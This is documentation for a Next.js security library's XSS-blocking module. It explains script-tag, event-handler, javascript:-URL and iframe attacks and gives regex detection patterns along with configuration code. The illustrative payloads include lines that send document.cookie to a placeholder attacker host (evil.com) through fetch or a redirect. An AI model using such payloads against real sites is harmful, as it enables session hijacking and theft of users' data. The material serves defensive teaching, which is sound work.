# XSS Protection (Cross-Site Scripting)

## Overview

XSS protection detects and blocks malicious JavaScript code in payloads that could be executed in users' browsers to steal data, hijack sessions, or deface applications.

## Why This Is Important

### The Problem: Cross-Site Scripting Attacks

Attackers inject malicious scripts that execute in victims' browsers:

#### 1. **Script Tag Injection**

```javascript
// Attacker comment on blog
{
  "comment": "<script>alert(document.cookie)</script>"
}

// Without protection:
// Comment stored in database
// When page loads: <div>{comment}</div>
// Script executes: alert(document.cookie)
// Attacker steals session cookies
```

**What Happens Without Protection:**
- Malicious script stored
- Executes in all users' browsers
- Session cookies stolen
- Users' accounts compromised

**Impact:** Session hijacking Account takeover Data theft Identity impersonation

#### 2. **Event Handler Injection**

```javascript
// Attacker profile update
{
  "avatar": "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"
}

// Without protection:
// Renders: <img src=x onerror='...'>
// Browser triggers onerror
// Sends cookies to attacker's server
```

**What Happens Without Protection:**
- Event handlers execute JavaScript
- Data exfiltrated silently
- User unaware of attack

**Impact:**
- Silent data theft
- Stealth attacks
- Data exfiltration
- Targeted attacks

#### 3. **JavaScript Protocol**

```javascript
// Attacker malicious link
{
  "website": "javascript:void(window.location='https://evil.com?cookie='+document.cookie)"
}

// Without protection:
// Renders: <a href="javascript:...">Click here</a>
// User clicks link
// JavaScript executes
// Redirected with stolen cookies
```

**What Happens Without Protection:**
- Links execute JavaScript
- Victims tricked into clicking
- Credentials stolen

**Impact:**
- Phishing attacks
- Malicious redirects
- Cookie theft
- Credential harvesting

#### 4. **iFrame Injection**

```javascript
// Attacker embeds malicious iframe
{
  "content": "<iframe src='https://evil.com/keylogger'></iframe>"
}

// Without protection:
// Iframe loads malicious page
// Keylogger captures all input
// Sends to attacker's server
```

**What Happens Without Protection:**
- Malicious content embedded
- Keyloggers capture input
- All user actions monitored

**Impact:**
- Keystroke logging
- Password capture
- Form data theft
- Persistent monitoring

## How nextjs-fortress Solves This

### Detection Patterns

```typescript
export const XSS_PATTERNS = [
  /<script[^>]*>.*<\/script>/gi,           // Script tags
  /on\w+\s*=\s*["']?[^"']*["']?/gi,        // Event handlers (onclick, onerror, etc.)
  /javascript:/gi,                          // JavaScript protocol
  /<iframe[^>]*>/gi,                        // iFrames
  /<object[^>]*>/gi,                        // Object tags
  /<embed[^>]*>/gi,                         // Embed tags
  /<img[^>]*onerror/gi,                     // Image onerror
  /eval\s*\(/gi,                            // eval() calls
  /expression\s*\(/gi,                      // CSS expression
  /vbscript:/gi,                            // VBScript protocol
  /data:text\/html/gi,                      // Data URIs with HTML
];
```

### The Algorithm

```typescript
/**
 * Check a string against XSS patterns
 */
private checkPatterns(
  str: string,
  patterns: RegExp[],
  type: string
): ValidationResult {
  for (const pattern of patterns) {
    pattern.lastIndex = 0; // Reset regex state
    const match = pattern.exec(str);

    if (match) {
      return {
        valid: false,
        severity: 'high',
        message: `XSS injection detected: "${match[0]}"`,
        rule: 'xss_injection',
        pattern: match[0],
        confidence: 0.9,
      };
    }
  }

  return { valid: true };
}
```

## Configuration

### Basic Setup

```typescript
import { FortressConfig } from 'nextjs-fortress';

export const fortressConfig: FortressConfig = {
  modules: {
    injection: {
      enabled: true,
      checks: ['xss'], // Enable XSS detection
    },
  },
};
```

### With Custom Patterns

```typescript
export const fortressConfig: FortressConfig = {
  modules: {
    injection: {
      enabled: true,
      checks: ['xss'],
      customPatterns: [
        /<style.*>.*<\/style>/gi,        // Style injection
        /expression\(/gi,                 // CSS expressions
        /<link[^>]*>/gi,                  // Link tags
        /<base[^>]*>/gi,                  // Base tag hijacking
      ],
    },
  },
};
```

## Attack Examples

### Example 1: Cookie Theft

```javascript
// Attacker comment
POST /api/comments
{
  "text": "<script>fetch('https://evil.com?c='+document.cookie)</script>"
}

// Fortress detects:
// Pattern match: "<script>" found
// Severity: high
// Result: BLOCKED ✅
```

### Example 2: Event Handler Attack

```javascript
// Attacker profile picture
POST /api/user/avatar
{
  "url": "<img src=x onerror=alert('XSS')>"
}

// Fortress detects:
// Pattern match: "onerror=" found
// Result: BLOCKED ✅
```

### Example 3: JavaScript URL

```javascript
// Attacker malicious link
POST /api/post
{
  "link": "javascript:alert(document.cookie)"
}

// Fortress detects:
// Pattern match: "javascript:" found
// Result: BLOCKED ✅
```

### Example 4: iFrame Embedding

```javascript
// Attacker embed malicious site
POST /api/content
{
  "html": "<iframe src='https://evil.com/phishing'></iframe>"
}

// Fortress detects:
// Pattern match: "<iframe" found
// Result: BLOCKED ✅
```

## How to Initialize

```typescript
import { FortressConfig, FortressLogger } from 'nextjs-fortress';

export const fortressConfig: FortressConfig = {
  enabled: true,
  mode: 'development',

  modules: {
    injection: {
      enabled: true,
      checks: ['xss'],
    },
  },

  onSecurityEvent: async (event) => {
    if (event.detection.rule === 'xss_injection') {
      const logger = new FortressLogger({
        enabled: true,
        level: 'warn',
        destination: 'console',
      });

      logger.warn('🚨 XSS Attack Blocked', {
        pattern: event.detection.pattern,
        ip: event.request.ip,
        path: event.request.path,
      });
    }
  },
};
```

## Summary

**What happens without XSS protection:**
- Session hijacking
- Cookie theft
- Account takeover
- Data exfiltration

**What nextjs-fortress provides:**
- Script tag detection
- Event handler blocking
- Protocol validation
- iFrame prevention

**How to initialize:**
```typescript
injection: {
  enabled: true,
  checks: ['xss'],
}
```

---

**Related Documentation:**
- [SQL Injection Protection](./sql-injection.md)
- [Command Injection Protection](./command-injection.md)
- [Code Injection Protection](./code-injection.md)